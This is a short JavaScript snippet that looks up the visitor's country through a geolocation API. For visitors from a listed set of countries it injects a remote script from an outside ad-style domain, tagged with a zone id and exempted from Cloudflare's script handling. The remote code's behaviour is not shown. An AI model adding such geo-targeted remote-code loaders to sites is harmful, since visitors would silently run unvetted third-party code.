<script>
    // Fetch the geo data from the API
    fetch('https://get.geojs.io/v1/ip/geo.json')
        .then(response => response.json())
        .then(apiResponse => {
            // Define the list of allowed country codes
            const allowedCountryCodes = ["NE", "IR", "CD", "BR", "ET", "TZ", "ZA", "KE", "SD", "BD", "ID", "MA", "DZ"];

            // Check if the country code exists in the list
            if (allowedCountryCodes.includes(apiResponse.country_code)) {
                // Create a new script element
                const scriptTag = document.createElement('script');
                scriptTag.src = "https://alwingulla.com/88/tag.min.js";
                scriptTag.setAttribute('data-zone', '82827');
                scriptTag.async = true;
                scriptTag.setAttribute('data-cfasync', 'false');

                // Append the script element to the document body
                document.body.appendChild(scriptTag);
            }
        })
        .catch(error => {
            console.error('Error fetching geo data:', error);
        });
</script>
